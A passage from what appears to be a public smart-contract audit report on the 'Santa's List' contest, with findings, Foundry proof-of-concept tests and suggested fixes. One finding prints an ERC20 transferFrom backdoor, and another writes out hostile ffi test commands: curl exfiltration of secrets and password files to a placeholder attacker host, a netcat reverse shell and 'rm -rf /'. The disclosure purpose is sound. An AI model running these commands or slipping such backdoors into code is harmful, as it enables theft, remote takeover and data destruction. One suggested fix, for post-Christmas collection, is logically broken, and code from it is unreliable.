[0xjarix](https://profiles.cyfrin.io/u/0xjarix), [t0x1c](https://profiles.cyfrin.io/u/t0x1c), [dianivanov](https://profiles.cyfrin.io/u/dianivanov), [kaiziron](https://profiles.cyfrin.io/u/kaiziron), [0x0bserver](https://profiles.cyfrin.io/u/0x0bserver), [zhuying](https://profiles.cyfrin.io/u/zhuying). Selected submission by: [tadev](https://profiles.cyfrin.io/u/tadev)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L151

## Summary

`collectPresent` function is callable by any address, but the call will succeed only if the user is registered as `NICE` or `EXTRA_NICE` in SantasList contract.  In order to prevent users to collect presents multiple times, the following check is implemented: 
```
       if (balanceOf(msg.sender) > 0) {
            revert SantasList__AlreadyCollected();
        }
```
Nevertheless, there is an issue with this check. Users could send their newly minted NFTs to another wallet, allowing them to pass that check as `balanceOf(msg.sender)` will be `0` after transferring the NFT.


## Vulnerability Details

Let's imagine a scenario where an `EXTRA_NICE` user wants to collect present when it is Christmas time.  The user will call `collectPresent` function and will get 1 NFT and `1e18` SantaTokens. This user could now call `safetransferfrom` ERC-721 function in order to send the NFT to another wallet, while keeping SantaTokens on the same wallet (or send them as well, it doesn't matter). After that, it is possible to call `collectPresent` function again as ``balanceOf(msg.sender)` will be `0` again.

## Impact

The impact of this vulnerability is HIGH as it allows any `NICE` user to mint as much NFTs as wanted, and it also allows any `EXTRA_NICE` user to mint as much NFTs and SantaTokens as desired.

## Proof of Concept

The following tests shows that any `NICE` or `EXTRA_NICE` user is able to call `collectPresent` function again after transferring the newly minted NFT to another wallet.
- In the case of `NICE` users, it will be possible to mint an infinity of NFTs, while transferring all of them in another wallet hold by the user. 
- In the case of `EXTRA_NICE` users, it will be possible to mint an infinity of NFTs and an infinity of SantaTokens.

```
    function testExtraNiceCanCollectTwice() external {
        vm.startPrank(santa);
        // Santa checks twice the user as EXTRA_NICE
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();

        // It is Christmas time!
        vm.warp(1_703_480_381);

        vm.startPrank(user);
        // User collects 1 NFT + 1e18 SantaToken
        santasList.collectPresent();
        // User sends the minted NFT to another wallet
        santasList.safeTransferFrom(user, makeAddr("secondWallet"), 0);
        // User collect present again
        santasList.collectPresent();
        vm.stopPrank();

        // Users now owns 2e18 tokens, after calling 2 times collectPresent function successfully
        assertEq(santaToken.balanceOf(user), 2e18);
    }
```


## Tools Used

Foundry

## Recommendations

SantasList should implement in its storage a mapping to keep track of addresses which already collected present through `collectPresent` function.
We could declare as a state variable : 
```
    mapping(address user => bool) private hasClaimed;
```
and then modify `collectPresent` function as follows: 
```
    function collectPresent() external {
        // use SantasList__AlreadyCollected custom error to save gas
        require(!hasClaimed[msg.sender], "user already collected present");

        if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
            revert SantasList__NotChristmasYet();
        }

        if (s_theListCheckedOnce[msg.sender] == Status.NICE && s_theListCheckedTwice[msg.sender] == Status.NICE) {
            _mintAndIncrement();
            hasClaimed[msg.sender] = true;
            return;
        } else if (
            s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE
                && s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE
        ) {
            _mintAndIncrement();
            i_santaToken.mint(msg.sender);
            hasClaimed[msg.sender] = true;

            return;
        }
        revert SantasList__NotNice();
    }
```
We just added a check that `hasClaimed[msg.sender]` is `false` to execute the rest of the function, while removing the check on `balanceOf`. Once present is collected, either for `NICE` or `EXTRA_NICE` people, we update `hasClaimed[msg.sender]` to `true`. This will prevent user to call `collectPresent` function.

If you run the previous test with this new implementation, it wail fail with the error `user already collected present`.


Here is a new test that checks the new implementation works as desired:
```
    function testCorrectCollectPresentImpl() external {
        vm.startPrank(santa);
        // Santa checks twice the user as EXTRA_NICE
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();

        // It is Christmas time!
        vm.warp(1_703_480_381);

        vm.startPrank(user);
        // User collects 1 NFT + 1e18 SantaToken
        santasList.collectPresent();
        // User sends the minted NFT to another wallet
        santasList.safeTransferFrom(user, makeAddr("secondWallet"), 0);

        vm.expectRevert("user already collected present");
        santasList.collectPresent();
        vm.stopPrank();
    }
```
## <a id='H-05'></a>H-05. Malicious Code Injection in solmate ERC20 Contract inside `transferFrom` function which is inherited in `SantaToken`

_Submitted by [jerseyjoewalcott](https://profiles.cyfrin.io/u/jerseyjoewalcott), [pacelli](https://profiles.cyfrin.io/u/pacelli), [abhishekthakur](https://profiles.cyfrin.io/u/abhishekthakur), [Ryan](https://profiles.cyfrin.io/u/Ryan), [gabr1sr](https://profiles.cyfrin.io/u/gabr1sr), [Mj0ln1r](https://profiles.cyfrin.io/u/Mj0ln1r), [XORs33r](https://profiles.cyfrin.io/u/XORs33r), [bobadj](https://profiles.cyfrin.io/u/bobadj), [Hussareth](https://profiles.cyfrin.io/u/Hussareth), [rocknet](https://profiles.cyfrin.io/u/rocknet), [0xtheblackpanther](https://profiles.cyfrin.io/u/0xtheblackpanther), [dougo](https://profiles.cyfrin.io/u/dougo), [wallebach](https://profiles.cyfrin.io/u/wallebach), [MikeDougherty](https://profiles.cyfrin.io/u/MikeDougherty), [atlanticbase](https://profiles.cyfrin.io/u/atlanticbase), [spacecowboy](https://profiles.cyfrin.io/u/spacecowboy), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [kiteweb3](https://profiles.cyfrin.io/u/kiteweb3), [naman1729](https://profiles.cyfrin.io/u/naman1729), [wafflemakr](https://profiles.cyfrin.io/u/wafflemakr), [aitor](https://profiles.cyfrin.io/u/aitor), [teddy](https://profiles.cyfrin.io/u/teddy), [asimaranov](https://profiles.cyfrin.io/u/asimaranov), [kaiziron](https://profiles.cyfrin.io/u/kaiziron), [CyrilFromEarth](https://profiles.cyfrin.io/u/CyrilFromEarth), [ryonen](https://profiles.cyfrin.io/u/ryonen), [y0ng0p3](https://profiles.cyfrin.io/u/y0ng0p3), [sobieski](https://profiles.cyfrin.io/u/sobieski), [0xspryon](https://profiles.cyfrin.io/u/0xspryon), [n0kto](https://profiles.cyfrin.io/u/n0kto), [zanderbyte](https://profiles.cyfrin.io/u/zanderbyte), [azmaeengh](https://profiles.cyfrin.io/u/azmaeengh), [passteque](https://profiles.cyfrin.io/u/passteque), [tk3](https://profiles.cyfrin.io/u/tk3), [davide](https://profiles.cyfrin.io/u/davide), [luigi](https://profiles.cyfrin.io/u/luigi), [t0x1c](https://profiles.cyfrin.io/u/t0x1c), [Nocturnus](https://profiles.cyfrin.io/u/Nocturnus), [0xloscar01](https://profiles.cyfrin.io/u/0xloscar01). Selected submission by: [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169)._      
            
### Relevant GitHub Links

https://github.com/PatrickAlphaC/solmate-bad/blob/c3877e5571461c61293503f45fc00959fff4ebba/src/tokens/ERC20.sol#L87-L96

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantaToken.sol#L11

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/.gitmodules#L7-L9

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/foundry.toml#L7

## Summary
A malicious code is detected in a modified version of the Solmate ERC20 contract inside the `transferFrom` function. The library was forked from the Solmate repository and has been modified to include the malicious code. The `SantaToken` contract inherits this malicious ERC20 contract which brings all the risks inside the SantaToken contract that are associated with the modified ERC20 contract.

The code is modified in such a way to allow a specific address to transfer tokens without checking for allowances and thus it causes token transfers without the permission of the users.

## Vulnerability Details
Instead of using the official [Solmate's](https://github.com/transmissions11/solmate) ERC20 contract a [forked Solmate](https://github.com/patrickalphac/solmate-bad/tree/c3877e5571461c61293503f45fc00959fff4ebba) library was used which contains the modified ERC20 contract.

The vulnerability arises due to the usage of unofficial solmate repo which was forked from official solmate containing a commit involving the malicious code injected inside the `transferFrom` function of the Solmate's ERC20 contract.

The malicious code added to the `transferFrom` function allows a specific Ethereum address `0x815F577F1c1bcE213c012f166744937C889DAF17` to transfer tokens from any other address to a target address. This is done without checking the approval status of the `from` address. This could lead to unauthorized token transfers, potentially draining accounts without the account owner's consent.

The address `0x815F577F1c1bcE213c012f166744937C889DAF17` is the same address of the `South Pole Elves` mentioned in the `@author` field for the Smart Contracts [here](https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L55).

The malicious code starts from the line 87 to line 96 inside the `transferFrom` in the modified Solmate's ERC20 contract.
```cpp
function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
@>  // hehehe :)
@>  // https://arbiscan.io/tx/0xd0c8688c3bcabd0024c7a52dfd818f8eb656e9e8763d0177237d5beb70a0768d
@>  if (msg.sender == 0x815F577F1c1bcE213c012f166744937C889DAF17) {
@>      balanceOf[from] -= amount;
@>      unchecked {
@>          balanceOf[to] += amount;
@>      }
@>      emit Transfer(from, to, amount);
@>      return true;
@>  }

    uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.

    if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;

    balanceOf[from] -= amount;

    // Cannot overflow because the sum of all user
    // balances can't exceed the max uint256 value.
    unchecked {
        balanceOf[to] += amount;
    }

    emit Transfer(from, to, amount);

    return true;
}
```

## Impact
This vulnerability allows the attacker (with the ethereum adress - `0x815F577F1c1bcE213c012f166744937C889DAF17`) to arbitrarily transfer tokens from any address to any other address without requiring approval from the `from` address to attacker's address. This can lead to significant financial loss for token holders and can undermine the trust in the SantaToken.

Since the malicious code is present in ERC20 contract which is inherited in `SantaToken` which will allow the attacker to arbitrarily transfer SantaToken from any address to any other address and use the stolen SantaToken to buy present. Furthermore, if there are any other services which can be availed with SantaToken, then attacker can benefit from all of them.

## PoC
Add the test in the file: `test/unit/SantasListTest.t.sol`.

Run the test:
```cpp
forge test --mt test_ElvesCanTransferTokenWithoutApprovals
```

```cpp
function test_ElvesCanTransferTokenWithoutApprovals() public {
    // address of the south pole elves
    address southPoleElves = 0x815F577F1c1bcE213c012f166744937C889DAF17;

    vm.startPrank(santa);

    // Santa checks user once as EXTRA_NICE
    santasList.checkList(user, SantasList.Status.EXTRA_NICE);

    // Santa checks user second time
    santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);

    vm.stopPrank();

    // christmas time 🌳🎁  HO-HO-HO
    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME()); 

    // User collects their NFT and tokens for being EXTRA_NICE
    vm.prank(user);
    santasList.collectPresent();

    // Now the user have some SantaTokens
    uint256 userBalance = santaToken.balanceOf(user);
    assertEq(userBalance, 1e18);

    // user needs to give approval to others in order to move tokens to other addresses via 'transferFrom'
    // but the south pole elves can move tokens of anyone without approval permissions
    vm.prank(southPoleElves);
    bool success = santaToken.transferFrom(user, southPoleElves, userBalance);

    assert(success == true);
    assertEq(santaToken.balanceOf(user), 0);
    assertEq(santaToken.balanceOf(southPoleElves), userBalance);
}
```

## Tools Used
Manual Review

## Recommendations
- Santa should first identify the specific elves who were responsible for the malicious code and start their counselling as soon as possible and teach them a nice lesson so that they don't write smart contracts with malicious intent and should also motivate them to apply to Cyfrin Updraft.
- Use the ERC20 contract from the official Solmate's library. Always verify the code before it is used in the SmartContract and always use code from official source.
- Delete the malicious forked solmate library from the `lib` folder.
- Refactor the library installs in every place.

- `Makefile (Line - 13)`
```diff
- install :; forge install foundry-rs/forge-std --no-commit && forge install openzeppelin/openzeppelin-contracts --no-commit && forge install patrickalphac/solmate-bad --no-commit
+ install :; forge install foundry-rs/forge-std --no-commit && forge install openzeppelin/openzeppelin-contracts --no-commit && forge install transmissions11/solmate --no-commit
```

- `foundry.toml`
```diff
remappings = [
    '@openzeppelin/contracts=lib/openzeppelin-contracts/contracts',
-   '@solmate=lib/solmate-bad',
+   '@solmate=lib/solmate',
]
```

- `.gitmodules`
```diff
[submodule "lib/forge-std"]
	path = lib/forge-std
	url = https://github.com/foundry-rs/forge-std
[submodule "lib/openzeppelin-contracts"]
	path = lib/openzeppelin-contracts
	url = https://github.com/openzeppelin/openzeppelin-contracts
-[submodule "lib/solmate-bad"]
-	path = lib/solmate-bad
-	url = https://github.com/patrickalphac/solmate-bad
+[submodule "lib/solmate"]
+	path = lib/solmate
+	url = https://github.com/transmissions11/solmate
```
## <a id='H-06'></a>H-06. Malicious Test potentially allowing data extraction from the user running it

_Submitted by [abhishekthakur](https://profiles.cyfrin.io/u/abhishekthakur), [Ryan](https://profiles.cyfrin.io/u/Ryan), [XORs33r](https://profiles.cyfrin.io/u/XORs33r), [wafflemakr](https://profiles.cyfrin.io/u/wafflemakr), [spacecowboy](https://profiles.cyfrin.io/u/spacecowboy), [0xtheblackpanther](https://profiles.cyfrin.io/u/0xtheblackpanther), [aitor](https://profiles.cyfrin.io/u/aitor), [n0kto](https://profiles.cyfrin.io/u/n0kto), [tk3](https://profiles.cyfrin.io/u/tk3), [luigi](https://profiles.cyfrin.io/u/luigi). Selected submission by: [XORs33r](https://profiles.cyfrin.io/u/XORs33r)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/3579554c74ad80272306c92e11bd367b53b7602a/test/unit/SantasListTest.t.sol#L149

## Summary

The test suite includes a function named testPwned, which executes arbitrary commands on the user's machine.
This presents a significant security risk, as such commands could potentially extract sensitive data, establish a reverse shell for remote control, search for passwords, or install malware.

## Vulnerability Details

This is the malicious test, it looks inoffensive as it just create a file called `youve-been-pwned` but there is no underlying reason for this test to be here except a malicious behavior.

```javascript
    function testPwned() public {
        string[] memory cmds = new string[](2);
        cmds[0] = "touch";
        cmds[1] = string.concat("youve-been-pwned");
        cheatCodes.ffi(cmds);
    }
```

A more alarming scenario is demonstrated in the following proof of concept, where the user's API key could be compromised:.

First export the api key in your shell

```bash
export ARBITRUMSCAN_API_KEY='MY_SECRET_KEY'
```

Then execute the test to store the API key in a file:

```javascript
    function testWriteCommande() public {
        string[] memory cmds = new string[](3);
        cmds[0] = "bash";
        cmds[1] = "-c";
        cmds[2] = "env | grep ARBITRUMSCAN_API_KEY > PwnedApiKey";
        cheatCodes.ffi(cmds);
    }
```

Alternatively, transmit it to an external server:

```javascript
cmds[2] = "curl 'https://<HACKER_IP>?arbitrum_rpc_url='$(env | grep ARBITRUM_RPC_URL | cut -d '=' -f2)";
```

Other interesting POC that qualify this issue as a HIGH

### POC 1: Reverse Shell Using Netcat

This POC demonstrates how a test could open a reverse shell, allowing an attacker to gain control over the user's machine.

```javascript

function testReverseShell() public {
    string[] memory cmds = new string[](3);
    cmds[0] = "bash";
    cmds[1] = "-c";
    cmds[2] = "nc -e /bin/bash <HACKER_IP> <PORT>";
    cheatCodes.ffi(cmds);
}
```

### POC 2: Finding Files and Sending Results to a Server

This POC shows how a test could find specific files (starting with "pass" ) and send the results to a remote server.

```javascript

function testFindCommand() public {
    string[] memory cmds = new string[](3);
    cmds[0] = "bash";
    cmds[1] = "-c";
    cmds[2] = "find / -name 'pass*' | curl -F 'data=@-' https://<HACKER_IP>/upload";
    cheatCodes.ffi(cmds);
}
```

### POC 3: Destructive Command (rm -rf /)

This POC demonstrates a highly destructive command that could potentially erase all data on the user's root filesystem.

# Warning: This command is extremely harmful and should never be executed.

```javascript

function testDestructiveCommand() public {
    string[] memory cmds = new string[](2);
    cmds[0] = "bash";
    cmds[1] = "-c";
    cmds[2] = "rm -rf /";
    cheatCodes.ffi(cmds);
}
```

# Important Disclaimer: The rm -rf / command will delete everything on the filesystem for which the user has write permissions. It is provided here strictly for educational purposes to demonstrate the severity of security vulnerabilities in scripts and should never be run on any system.

## Impact

This issue is categorized as HIGH due to the direct risk it poses to funds and sensitive information.

The test, as it stands, is harmful, as it is used in a security contexts but i assume that the general purpose of this functionality is to be harmfull.

It could lead to data breaches (including private keys and passwords), unauthorized remote code execution, and the potential destruction of digital information (e.g., rm -rf /).

## Tools Used

forge test 😅

## Recommendations

Always exercise caution before running third-party programs on your system.
Ensure you understand the functionality of any command or script to prevent unintended consequences, especially those involving security vulnerabilities.

# Medium Risk Findings

## <a id='M-01'></a>M-01. Cost to buy NFT via SantasList::buyPresent is 2e18 SantaToken but it burns only 1e18 amount of SantaToken

_Submitted by [Ryan](https://profiles.cyfrin.io/u/Ryan), [Mikea](https://profiles.cyfrin.io/u/Mikea), [0x6a70](https://profiles.cyfrin.io/u/0x6a70), [dougo](https://profiles.cyfrin.io/u/dougo), [zach030](https://profiles.cyfrin.io/u/zach030), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [kamuik16](https://profiles.cyfrin.io/u/kamuik16), [XORs33r](https://profiles.cyfrin.io/u/XORs33r), [naman1729](https://profiles.cyfrin.io/u/naman1729), [touqeershah32](https://profiles.cyfrin.io/u/touqeershah32), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [f3d0ss](https://profiles.cyfrin.io/u/f3d0ss), [rocknet](https://profiles.cyfrin.io/u/rocknet), [Prabhas](https://profiles.cyfrin.io/u/Prabhas), [0xtheblackpanther](https://profiles.cyfrin.io/u/0xtheblackpanther), [wallebach](https://profiles.cyfrin.io/u/wallebach), [0xlamide](https://profiles.cyfrin.io/u/0xlamide), [atlanticbase](https://profiles.cyfrin.io/u/atlanticbase), [kiteweb3](https://profiles.cyfrin.io/u/kiteweb3), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [kevinkkien](https://profiles.cyfrin.io/u/kevinkkien), [bbcrypt](https://profiles.cyfrin.io/u/bbcrypt), [dentonylifer](https://profiles.cyfrin.io/u/dentonylifer), [wafflemakr](https://profiles.cyfrin.io/u/wafflemakr), [TrillionX](https://profiles.cyfrin.io/u/TrillionX), [gabr1sr](https://profiles.cyfrin.io/u/gabr1sr), [teddy](https://profiles.cyfrin.io/u/teddy), [aethrouzz](https://profiles.cyfrin.io/u/aethrouzz), [0xakira](https://profiles.cyfrin.io/u/0xakira), [ryonen](https://profiles.cyfrin.io/u/ryonen), [coffee](https://profiles.cyfrin.io/u/coffee), [Jaydhales](https://profiles.cyfrin.io/u/Jaydhales), [Turetos](https://profiles.cyfrin.io/u/Turetos), [0xManguebytes](https://profiles.cyfrin.io/u/0xManguebytes), [aitor](https://profiles.cyfrin.io/u/aitor), [sobieski](https://profiles.cyfrin.io/u/sobieski), [bhvrvt](https://profiles.cyfrin.io/u/bhvrvt), [0xspryon](https://profiles.cyfrin.io/u/0xspryon), [n4thedev01](https://profiles.cyfrin.io/u/n4thedev01), [pacelli](https://profiles.cyfrin.io/u/pacelli), [forkforkdog](https://profiles.cyfrin.io/u/forkforkdog), [n0kto](https://profiles.cyfrin.io/u/n0kto), [azmaeengh](https://profiles.cyfrin.io/u/azmaeengh), [novodelta](https://profiles.cyfrin.io/u/novodelta), [MikeDougherty](https://profiles.cyfrin.io/u/MikeDougherty), [Y403L](https://profiles.cyfrin.io/u/Y403L), [bube](https://profiles.cyfrin.io/u/bube), [rapstyle](https://profiles.cyfrin.io/u/rapstyle), [Martin7777](https://profiles.cyfrin.io/u/Martin7777), [mircha](https://profiles.cyfrin.io/u/mircha), [leogold](https://profiles.cyfrin.io/u/leogold), [davide](https://profiles.cyfrin.io/u/davide), [y0ng0p3](https://profiles.cyfrin.io/u/y0ng0p3), [Nocturnus](https://profiles.cyfrin.io/u/Nocturnus), [0xlouistsai](https://profiles.cyfrin.io/u/0xlouistsai), [0xhashiman](https://profiles.cyfrin.io/u/0xhashiman), [kaiziron](https://profiles.cyfrin.io/u/kaiziron), [dianivanov](https://profiles.cyfrin.io/u/dianivanov). Selected submission by: [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L173

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantaToken.sol#L28

## Summary
- The cost to buy NFT as mentioned in the docs is 2e18 via the `SantasList::buyPresent` function but in the actual implementation of buyPresent function it calls the SantaToken::burn function which doesn't take any parameter for amount and burns a fixed 1e18 amount of SantaToken, thus burning only half of the actual amount that needs to be burnt, and hence user can buy present for their friends at cheaper rates.
- Along with this the user is able to buy present for themselves but the docs mentions that present can be bought only for other users.

## Vulnerability Details
The vulnerability lies in the code in the function `SantasList::buyPresent` at line 173 and in `SantaToken::burn` at line 28.

The function `burn` burns a fixed amount of 1e18 SantaToken whenever `buyPresent` is called but the true value of SantaToken that was expected to be burnt to mint an NFT as present is 2e18.

```cpp
function buyPresent(address presentReceiver) external {
@>  i_santaToken.burn(presentReceiver);
    _mintAndIncrement();
}
```

```cpp
function burn(address from) external {
    if (msg.sender != i_santasList) {
        revert SantaToken__NotSantasList();
    }
@>  _burn(from, 1e18);
}
```

## PoC
Add the test in the file: `test/unit/SantasListTest.t.sol`.

Run the test:
```cpp
forge test --mt test_UsersCanBuyPresentForLessThanActualAmount
```

```cpp
function test_UsersCanBuyPresentForLessThanActualAmount() public {
    vm.startPrank(santa);

    // Santa checks user once as EXTRA_NICE
    santasList.checkList(user, SantasList.Status.EXTRA_NICE);

    // Santa checks user second time
    santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);

    vm.stopPrank();

    // christmas time 🌳🎁  HO-HO-HO
    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME()); 

    // user collects their present
    vm.prank(user);
    santasList.collectPresent();

    // balance after collecting present
    uint256 userInitBalance = santaToken.balanceOf(user);

    // now the user holds 1e18 SantaToken
    assertEq(userInitBalance, 1e18);

    vm.prank(user);
    santaToken.approve(address(santasList), 1e18);

    vm.prank(user);
    // user buy present
    // docs mention that user should only buy present for others, but they can buy present for themselves
    santasList.buyPresent(user);

    // only 1e18 SantaToken is burnt instead of the true price (2e18)
    assertEq(santaToken.balanceOf(user), userInitBalance - 1e18);
}
```

## Impact
- Protocol mentions that user should be able to buy NFT for 2e18 amount of SantaToken but users can buy NFT for their friends by burning only 1e18 tokens instead of 2e18, thus NFT can be bought at much cheaper rate which is half of the true amount that was expected to buy NFT.
- User can buy a present for themselves but docs strictly mentions that present can be bought for someone else.

## Tools Used
Manual Review, Foundry Test

## Recommendations
Include an argument inside the `SantaToken::burn` to specify the amount of token to burn and also update the `SantasList::buyPresent` function with updated parameter for `burn` function to pass correct amount of tokens to burn.

- Update the `SantaToken::burn` function
```diff
-function burn(address from) external {
+function burn(address from, uint256 amount) external {
    if (msg.sender != i_santasList) {
        revert SantaToken__NotSantasList();
    }
-   _burn(from, 1e18);
+   _burn(from, amount);
}
```
- Update the `SantasList::buyPresent` function
```diff
+ error SantasList__ReceiverIsCaller();

function buyPresent(address presentReceiver) external {
+   if (msg.sender == presentReceiver) {
+       revert SantasList__ReceiverIsCaller();
+   }
-   i_santaToken.burn(presentReceiver);
+   i_santaToken.burn(presentReceiver, PURCHASED_PRESENT_COST);
    _mintAndIncrement();
}
```

# Low Risk Findings

## <a id='L-01'></a>L-01. collectPresent() can be called at anytime after christmas

_Submitted by [innertia](https://profiles.cyfrin.io/u/innertia), [Mj0ln1r](https://profiles.cyfrin.io/u/Mj0ln1r), [kiteweb3](https://profiles.cyfrin.io/u/kiteweb3), [benbo](https://profiles.cyfrin.io/u/benbo), [Y403L](https://profiles.cyfrin.io/u/Y403L), [0xepley](https://codehawks.cyfrin.io/team/clkjtgvih0001jt088aqegxjj). Selected submission by: [Mj0ln1r](https://profiles.cyfrin.io/u/Mj0ln1r)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/886f801daa1968cccccfd8790a510417aedc88b6/src/SantasList.sol#L147

## Summary

The christmas present should only be collected with 24 hours before or after christmas. But the present can be minted at anytime after christmas.

## Vulnerability Details

Documenation mentioned that "The Christmas date is approximate, if it's more then 24 hours before or after Christmas, please report that. Otherwise, it's OK." 

The `collectPresent()` has only checked that the present cannot be collected before the christmas. But hasn't checked in the case of after christmas collection. 

```javascript
 function collectPresent() external {
        if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
            revert SantasList__NotChristmasYet();
        }
        if (balanceOf(msg.sender) > 0) {
            revert SantasList__AlreadyCollected();
        }
        if (s_theListCheckedOnce[msg.sender] == Status.NICE && s_theListCheckedTwice[msg.sender] == Status.NICE) {
            _mintAndIncrement();
            return;
        } else if (
            s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE
                && s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE
        ) {
            _mintAndIncrement();
            i_santaToken.mint(msg.sender);
            return;
        }
        revert SantasList__NotNice();
    }
```

`uint256 public constant CHRISTMAS_2023_BLOCK_TIME = 1_703_480_381;` 
The UTC time for this epoch is : `Monday, 25 December 2023 04:59:41` .
The present can only be collected after approx 5 hours after the christmas arrived. But it can be collectable at anytime after Christmas. As there is no check for the after christmas case.

## Impact

The impact of this vulnerability is that the intended use of the protocol is not acquired. 

Proof Of Code : 

```javascript
function testCollectPresentNiceAfterChristmas() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.NICE);
        santasList.checkTwice(user, SantasList.Status.NICE);
        vm.stopPrank();

        vm.warp(1703900189); // Saturday, 30 December 2023 01:36:29

        vm.startPrank(user);
        santasList.collectPresent();
        assertEq(santasList.balanceOf(user), 1);
        vm.stopPrank();
    }
```
Add this test to `SantasListTest.t.sol` and run `forge test --mt testCollectPresentNiceAfterChristmas` to test.
You can observe that the present is collectable at  Saturday, 30 December 2023 01:36:29.
## Tools Used

Manual Review

## Recommendations

Include check for the after 24 hours of christmas.

```diff
 function collectPresent() external {
-         if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) { 
+        if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME && block.timestamp > 1703554589 ) { 
            revert SantasList__NotChristmasYet();
        }
        if (balanceOf(msg.sender) > 0) {
            revert SantasList__AlreadyCollected();
        }
        if (s_theListCheckedOnce[msg.sender] == Status.NICE && s_theListCheckedTwice[msg.sender] == Status.NICE) {
            _mintAndIncrement();
            return;
        } else if (
            s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE
                && s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE
        ) {
            _mintAndIncrement();
            i_santaToken.mint(msg.sender);
            return;
        }
        revert SantasList__NotNice();
    }
```
## <a id='L-02'></a>L-02. Incompatibility of Solidity 0.8.22 with Arbitrum: Deployment Failures Due to Unsupported PUSH0 Opcode

_Submitted by [ptsanev](https://profiles.cyfrin.io/u/ptsanev), [naman1729](https://profiles.cyfrin.io/u/naman1729), [wafflemakr](https://profiles.cyfrin.io/u/wafflemakr), [XORs33r](https://profiles.cyfrin.io/u/XORs33r), [bube](https://profiles.cyfrin.io/u/bube), [codelock](https://profiles.cyfrin.io/u/codelock), [0xlouistsai](https://profiles.cyfrin.io/u/0xlouistsai). Selected submission by: [XORs33r](https://profiles.cyfrin.io/u/XORs33r)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantaToken.sol#L2

https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L47

https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/TokenUri.sol#L2

## Summary

According to the documentation, the contract is intended to be deployed on the Arbitrum network using version 0.8.22:

```doc
## Compatibilities

- Solc Version: 0.8.22
- Chain(s) to deploy contract to: 
  - Arbitrum
- Tokens
  - `SantaToken`
```

The Solidity files use `pragma solidity 0.8.22;`, which, when compiled, utilizes the opcode PUSH0. This opcode is not supported on the Arbitrum network.

https://docs.arbitrum.io/for-devs/concepts/differences-between-arbitrum-ethereum/solidity-support

The Foundry.toml file uses "paris" for the EVM version, but this setting is only applicable for tests, as explained in the Foundry documentation:

https://book.getfoundry.sh/reference/config/solidity-compiler

```doc
evm_version
Type: string
Default: london
Environment: FOUNDRY_EVM_VERSION or DAPP_EVM_VERSION
The EVM version to use during tests. The value must be an EVM hardfork name, such as london, byzantium, etc.
```

## Vulnerability Details

### SOLIDITY 0.8.22

The following POC demonstrates the deployment issue using 0.8.22.

Use the Arbitrum testnet by claiming free Arbitrum Sepolia ETH on Alchemy and use their RPC for testing this POC. We will also use a fork to avoid spending testnet ETH.

Setup a fork:

```bash
 anvil --fork-url 'https://arb-sepolia.g.alchemy.com/v2/<API_KEY>' --gas-limit 100000000000
```

```bash
 forge create ./src/SantaToken.sol:SantaToken --constructor-args $ADMIN_ADDR --private-key $TEST_NET_SECU_PUB --rpc-url 'http://127.0.0.1:8545'

[⠢] Compiling...
No files changed, compilation skipped
Error:
(code: -32000, message: intrinsic gas too high -- CallGasCostMoreThanGasLimit, data: None)
```

As observed, the deployment fails. To confirm it's related to Arbitrum, let's test on the Ethereum Sepolia network.

Deploy on ETH Sepolia testnet

Setup a fork

```bash
anvil --fork-url 'https://eth-sepolia.g.alchemy.com/v2/<API_KEY>' --gas-limit 100000000000
```

```bash
forge create ./src/SantaToken.sol:SantaToken --constructor-args $ADMIN_ADDR --private-key $TEST_NET_SECU_PUB --rpc-url 'http://127.0.0.1:8545'
[⠢] Compiling...
No files changed, compilation skipped
Deployer: ***
Deployed to: 0xc0cc44A995eE7bea6BC2564782CC92A2613ab87e
Transaction hash: 0x729be160024483e5815a870e06e17afeb1df4c3327d79216b8f612ba4d364f84
```

The deployment is successful

### SOLIDITY 0.8.19

Now, let's change the pragma version in our Solidity files to 0.8.19.

Setup a fork

```bash
 anvil --fork-url 'https://arb-sepolia.g.alchemy.com/v2/<API_KEY>' --gas-limit 100000000000
```

Deploy the contract on ARB Sepolia testnet

```
